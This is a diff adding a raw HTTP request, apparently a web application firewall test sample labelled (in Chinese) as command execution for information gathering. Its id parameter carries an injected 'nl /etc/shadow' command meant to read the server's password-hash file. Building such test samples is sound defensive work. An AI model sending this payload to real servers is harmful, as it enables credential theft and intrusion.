@@ -1,0 +1,9 @@
+# 命令执行_信息收集-06507017
+# 使用nl命令读取文件
+GET /?id=nl%20%2Fetc%2Fshadow&bid=hd_tag_m8mv263n HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv263n
+RM-PRO-Token: 9ca376c83bd5aa9b3641071d69113f55
+RM-PRO-Time: 1742808544372
+User-Agent: curl/7.83.1
+
